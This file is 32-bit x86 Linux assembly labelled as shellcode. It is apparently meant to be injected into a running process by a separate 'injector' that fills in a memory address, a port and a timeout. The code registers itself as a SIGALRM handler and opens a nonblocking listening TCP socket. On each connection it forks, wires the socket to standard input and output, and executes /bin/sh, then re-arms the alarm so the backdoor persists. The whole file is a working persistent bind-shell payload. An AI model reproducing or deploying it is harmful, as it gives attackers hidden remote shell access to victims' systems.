	.file	"scheduled_alarm.c"

	.text
.globl handler
	.type	handler, @function


# the shellcode starts here

handler:
	pusha

set_signal_handler:
	# signal(SIGALRM, handler)
	xorl	%eax, %eax
	xorl	%ebx, %ebx
	mov	$48, %al
	mov	$14, %bl
	jmp	set_signal_handler_end
load_handler:
	pop	%ecx
	subl	$0x18, %ecx # adjust %ecx to point handler()
	int	$0x80
	jmp	shellcode

set_signal_handler_end:
	call load_handler

shellcode:
	# check if already initialized
	mov     $0x4d454d50, %esi  # replaced by the injector (persistent memory address)
	mov     (%esi), %eax
	cmp     $0xdeadbeef, %eax
	je      accept_call        # jump if already initialized

socket_call:
	# call to sys_socketcall($0x01 (socket), *args)
	xorl    %eax, %eax
	mov     $102, %al
	xorl    %ebx, %ebx
	mov     $0x01, %bl
	jmp     socket_args
load_socket_args:
	pop     %ecx
	int     $0x80 # %eax = socket descriptor

	# save socket descriptor
	mov     $0xdeadbeef, %ebx
	mov     %ebx, (%esi)
	add     $4, %esi
	mov     %eax, (%esi)
	sub     $4, %esi
	jmp     fcntl_call

socket_args:
	call load_socket_args
	.long	0x02	# AF_INET
	.long	0x01	# SOCK_STREAM
	.long	0x00	# NULL

fcntl_call:
	# call to sys_fcntl(socket, F_GETFL)
	mov     %eax, %ebx
	xorl    %eax, %eax
	mov     $55, %al
	xorl    %ecx, %ecx
	mov     $3, %cl
	int     $0x80
	# call to sys_fcntl(socket, F_SETFL, flags | O_NONBLOCK)
	mov     %eax, %edx
	xorl    %eax, %eax
	mov     $55, %al
	mov     $4, %cl
	orl     $0x800, %edx  # O_NONBLOCK (nonblocking socket)
	int     $0x80

bind_call:
	# prepare sys_socketcall (bind) arguments
	jmp     struct_sockaddr
load_sockaddr:
	pop     %ecx
	push    $0x10   # sizeof(struct_sockaddr)
	push    %ecx    # struct_sockaddr address
	push    %ebx    # socket descriptor

	# call to sys_socketcall($0x02 (bind), *args)
	xorl    %eax, %eax
	mov     $102, %al
	xorl    %ebx, %ebx
	mov     $0x02, %bl
	mov     %esp, %ecx
	int     $0x80
	jmp     listen_call

struct_sockaddr:
	call load_sockaddr
	.short	0x02	# AF_INET
	.short	0x5250	# PORT (replaced by the injector)
	.long	0x00	# INADDR_ANY

listen_call:
	pop     %eax    # socket descriptor
	pop     %ebx
	push    $0x10   # queue (backlog)
	push    %eax    # socket descriptor

	# call to sys_socketcall($0x04 (listen), *args)
	xorl    %eax, %eax
	mov     $102, %al
	xorl    %ebx, %ebx
	mov     $0x04, %bl
	mov     %esp, %ecx
	int     $0x80

	# restore stack
	pop     %edi
	pop     %edi
	pop     %edi

accept_call:
	# prepare sys_socketcall (accept) arguments
	xorl    %ecx, %ecx
	push    %ecx         # socklen_t *addrlen
	push    %ecx         # struct sockaddr *addr
	add     $4, %esi
	push    (%esi)       # socket descriptor

	# call to sys_socketcall($0x05 (accept), *args)
	xorl    %eax, %eax
	mov     $102, %al
	xorl    %ebx, %ebx
	mov     $0x05, %bl
	mov     %esp, %ecx
	int     $0x80       # %eax = file descriptor or negative (on error)
	mov     %eax, %edx  # save file descriptor

	# restore stack
	pop     %edi
	pop     %edi
	pop     %edi

	# check return value
	test    %eax, %eax
	js      schedule_next_and_return  # jump on error (%eax is negative)


fork_child:
	# call to sys_fork()
	xorl    %eax, %eax
	mov     $2, %al
	int     $0x80

	test    %eax, %eax
	jz      dup2_multiple_calls  # child continue execution
	                             # parent goto schedule_next_and_return

schedule_next_and_return:

	# call to sys_close(socket file descriptor)
	# (since is used only by the child process)
	xorl    %eax, %eax
	mov     $6, %al
	mov     %edx, %ebx
	int     $0x80

	# call to sys_waitpid(-1, NULL, WNOHANG)
	# (to remove zombie processes)
	xorl    %eax, %eax
	mov     $7, %al
	xorl    %ebx, %ebx
	dec     %ebx
	xorl    %ecx, %ecx
	xorl    %edx, %edx
	mov     $1, %dl
	int     $0x80

	# alarm(timeout)
	xorl    %eax, %eax
	mov     $27, %al
	movl    $0x53434553, %ebx    # replaced by the injector (seconds)
	int     $0x80

	# return
	popa
	ret

dup2_multiple_calls:
	# dup2(socket, 2), dup2(socket, 1), dup2(socket, 0)
	xorl    %eax, %eax
	xorl    %ecx, %ecx
	mov     %edx, %ebx
	mov     $2, %cl
dup2_loop:
	mov     $63, %al
	int     $0x80
	dec     %ecx
	jns     dup2_loop

execve_call:
	# call to sys_execve(program, *args)
	xorl    %eax, %eax
	mov     $11, %al
	jmp     program_path
load_program_path:
	pop     %ebx
	# create argument list [program_path, NULL]
	xorl    %ecx, %ecx
	push    %ecx
	push    %ebx
	mov     %esp, %ecx
	mov	%esp, %edx
	int     $0x80

program_path:
	call load_program_path
	.ascii  "/bin/sh"


	.size	handler, .-handler
	.ident	"GCC: (Ubuntu 4.4.3-4ubuntu5) 4.4.3"
	.section	.note.GNU-stack,"",@progbits
